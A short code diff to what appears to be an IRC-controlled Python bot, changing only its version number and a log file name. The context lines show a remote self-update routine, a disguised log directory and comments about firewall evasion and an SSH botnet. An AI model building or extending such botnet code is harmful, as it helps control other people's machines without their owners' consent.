@@ -30,7 +30,7 @@ from modules.logging import logfile, log
 #       openvpn     implement openvpn for firewall evasion
 #       reverse ssh ssh botnet implementation
 
-version = "6.1.5"                                                   # bot version
+version = "6.1.6"                                                   # bot version
 
 try:
     logfile(filename="/var/softupdated/bot_v%s.log" % version)                         # redirects bot output to logfile
@@ -427,7 +427,7 @@ def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):   # updates th
         log('[>]    ',line)
         privmsg('[>]    %s' % line)
         if line.find("Finished") != -1:
-            privmsg("[+] Update Finished, relaunching. Log saved in updatelog.txt")
+            privmsg("[+] Update Finished, relaunching. Log saved in update.log")
             quit_status = True
             irc.send ( 'QUIT\r\n' )
             raise SystemExit
